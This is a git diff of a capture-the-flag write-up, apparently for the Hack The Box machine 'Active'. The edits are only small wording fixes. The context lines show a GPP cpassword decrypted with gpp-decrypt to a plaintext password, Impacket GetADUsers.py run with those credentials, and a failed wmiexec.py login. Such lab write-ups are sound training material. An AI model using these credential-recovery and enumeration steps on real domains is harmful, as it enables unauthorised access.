@@ -24,10 +24,7 @@ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH
 GPPstillStandingStrong2k18
 ```
 
-### Carefully running impact
-`/usr/share/doc/python3-impacket/examples/GetADUsers.py -h` no no
-`python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py` yes yes yes
-
+### Carefully running impacket
 ```
 python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all
 or
@@ -45,7 +42,7 @@ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administr
 
 [-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
 ```
-Because it's not a admin user
+Because it's not an admin user
 
 ### smbmap again to get user.txt
 ```
